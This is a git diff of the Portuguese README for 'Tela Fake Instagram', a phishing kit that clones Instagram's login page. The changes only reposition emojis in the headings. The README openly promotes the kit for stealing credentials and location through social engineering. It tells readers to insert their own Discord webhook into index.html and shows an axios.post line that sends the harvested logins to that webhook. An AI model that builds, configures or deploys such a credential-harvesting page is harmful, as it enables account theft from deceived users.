@@ -1,8 +1,8 @@
-# Tela Fake Instagram 📷
+# 📷 Tela Fake Instagram
 
 A **Tela Fake do Instagram** nada mais seria **um site identico ao site oficial**, porém usado de formas não éticas para obter credenciais de qualquer pessoa, desde que ela caia na sua engenharia social e faça a tentativa de login pelo site falso. Essa tela fake foi feita em **HTML** para **obter informações sobre a conta** + **localização** e **outros** !
 
-## Como recebo as informações ? 💾
+## 💾 Como recebo as informações ?
 
 - **Para receber o login, senha & outros coletado pelo Site Falso, é preciso ter um Servidor dentro do Discord**.
 - **Abra o `index.html` e troque o exemplo pela sua `Webhook Válida.` Exemplo**:
@@ -10,7 +10,7 @@ A **Tela Fake do Instagram** nada mais seria **um site identico ao site oficial*
   - `const response = await axios.post('https://discord.com/api/webhooks/exemplo/1nsaneqy', data);` `(Webhook Fictícia)`
   - **Este código acima poderá ser encontrado na linha ``258``**.
 
-## Consigo testar em minha máquina local ? 💻
+## 🖥 Consigo testar em minha máquina local ?
 
 Claro ! Para testar a **Tela Fake** em seu computador, basta seguir esses processo:
 
